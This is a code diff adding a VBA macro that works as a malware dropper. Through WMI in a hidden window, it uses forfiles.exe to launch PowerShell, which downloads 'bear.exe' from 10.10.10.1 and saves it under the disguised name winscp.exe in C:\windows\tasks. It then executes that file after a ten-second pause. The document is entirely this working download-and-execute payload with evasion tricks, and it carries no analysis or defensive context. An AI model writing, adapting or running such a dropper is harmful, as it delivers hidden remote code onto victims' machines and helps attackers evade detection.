@@ -1,0 +1,33 @@
+Public Declare PtrSafe Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As LongPtr)
+
+Public Function download() As Variant
+    Const HIDDEN_WINDOW = 0
+    strComputer = "."
+    Set objW_M_I_INST = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
+    Dim CC As String
+    
+    Set Sta_rt_up = objW_M_I_INST.Get("Win32_ProcessStartup")
+    Set objCfg = Sta_rt_up.SpawnInstance_
+    objCfg.ShowWindow = HIDDEN_WINDOW
+    Set obj_Proc = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
+    obj_Proc.Create "c:\windows\system32\forfiles.exe /p c:\windows\system32 /m notepad.exe /c ""powershell -nop -c iwr -useb 10.10.10.1/bear.exe -outfile C:\windows\tasks\winscp.exe""", Null, objConfig, intProcessID
+End Function
+     
+Public Function execute() As Variant
+    Const HIDDEN_WINDOW = 0
+    strComputer = "."
+    Set objW_M_I_INST = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
+    Dim CC As String
+    
+    Set Sta_rt_up = objW_M_I_INST.Get("Win32_ProcessStartup")
+    Set objCfg = Sta_rt_up.SpawnInstance_
+    objCfg.ShowWindow = HIDDEN_WINDOW
+    Set obj_Proc = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
+    obj_Proc.Create "C:\windows\tasks\winscp.exe", Null, objConfig, intProcessID
+End Function
+     
+Sub a()
+    download
+    Sleep 10000
+    execute
+End Sub
